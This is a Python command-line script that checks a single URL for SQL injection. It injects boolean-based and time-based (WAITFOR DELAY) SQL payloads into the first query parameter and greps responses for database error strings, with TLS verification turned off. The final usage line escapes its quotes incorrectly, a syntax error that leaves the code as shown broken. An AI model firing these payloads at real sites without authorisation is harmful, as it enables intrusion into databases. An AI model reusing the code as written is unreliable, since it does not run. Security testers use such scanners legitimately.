#!/usr/bin/env python3
"""
quick_sqli_scan.py  –  lightweight SQLi checker for one URL.
Usage:
    python quick_sqli_scan.py https://example.com/product?id=5
"""

import sys, re, time, httpx
from urllib.parse import urlsplit, parse_qsl, urlencode, urlunsplit

ERROR_REGEX = re.compile(
    r"(sql syntax|warning.*mysql|unclosed quotation mark|ORA-|PG::|SQLite|ODBC)",
    re.I,
)

BOOL_PAYLOADS = [
    ("1 AND 1=1", "1 AND 1=2"),    # numeric
    ("' AND 'a'='a", "' AND 'a'='b"),
]

TIME_PAYLOAD = "';WAITFOR DELAY '0:0:5'--"

def mutate_url(base_url, new_value):
    parts = urlsplit(base_url)
    qs = dict(parse_qsl(parts.query, keep_blank_values=True))
    # mutate first param only for demo
    first_key = next(iter(qs))
    qs[first_key] = new_value
    return urlunsplit((*parts[:3], urlencode(qs), parts.fragment))

def check_error(client, url):
    r = client.get(url, follow_redirects=True)
    if ERROR_REGEX.search(r.text):
        return "Error-string reflection"
    return None

def check_boolean(client, url):
    orig = client.get(url, follow_redirects=True).text
    for true_p, false_p in BOOL_PAYLOADS:
        url_true  = mutate_url(url, true_p)
        url_false = mutate_url(url, false_p)
        if client.get(url_true).text == orig and client.get(url_false).text != orig:
            return "Boolean-based difference"
    return None

def check_time(client, url, delta=4.0):
    mutated = mutate_url(url, TIME_PAYLOAD)
    t0 = time.perf_counter()
    client.get(mutated, follow_redirects=True, timeout=10)
    if time.perf_counter() - t0 > delta:
        return "Time-based delay"
    return None

def main(target):
    with httpx.Client(verify=False, timeout=8) as c:
        finding = (
            check_error(c, target)
            or check_boolean(c, target)
            or check_time(c, target)
        )
        if finding:
            print(f"[+] Possible SQLi via {finding}")
        else:
            print("[-] No obvious SQL-injection indicators detected.")

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print(f\"Usage: {sys.argv[0]} <full_url>\")
        sys.exit(1)
    main(sys.argv[1])
